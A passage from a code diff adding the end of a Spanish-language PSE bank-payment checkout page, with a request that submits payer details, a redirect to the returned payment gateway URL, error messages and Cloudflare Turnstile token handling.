+                    nombres: fullName,
+                    cedula: docNum,
+                    correo: email,
+                    celular: phone,
+                    monto: transactionData.amount,
+                    banco: bankVal,
+                    service: transactionData.name,
+                    ref: transactionData.ref,
+                    ticketId: transactionData.ticketId,
+                    cfToken: window._cfTokenPse || ''
+                })
+            }).then(function(res) { return res.json(); })
+              .then(function(resData) {
+                  var targetUrl = (resData && (resData.pse_url || resData.url)) ? (resData.pse_url || resData.url) : null;
+                  if (targetUrl && targetUrl !== 'pago-resumen-pse.html') {
+                      var stText = document.getElementById('save-status-text');
+                      if (stText) stText.innerText = 'Redirigiendo a la pasarela bancaria PSE...';
+                      setTimeout(function() {
+                          window.location.href = targetUrl;
+                      }, 1200);
+                      return;
+                  }
+                  // Sin redirección: flujo manual (banco apagado), sistema apagado o error de API
+                  var msg = (resData && resData.message) ? resData.message : 'No se pudo procesar el pago. Por favor intenta nuevamente.';
+                  showPseResultMessage(msg);
+              }).catch(function(err) {
+                  console.log('Error procesando pago:', err);
+                  showPseResultMessage('Error de conexión procesando el pago. Por favor intenta nuevamente.');
+              });
+            return false;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initPageData();
+            document.querySelectorAll('.apc-custom-input').forEach(function(inp) {
+                handleInputChange(inp);
+            });
+            handleBankChange(document.getElementById('pse-bank-select'));
+        });
+    </script>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>
+window._cfTokenPse = '';
+window.onCfPse = function(token) {
+    window._cfTokenPse = token || '';
+    var err = document.getElementById('cf-pse-error');
+    if (err) err.style.display = 'none';
+};
+window.onCfPseExpired = function() {
+    window._cfTokenPse = '';
+};
+</script>
+<script src="assets/js/loader-bfcache-fix.js"></script>
+</body>
+</html>
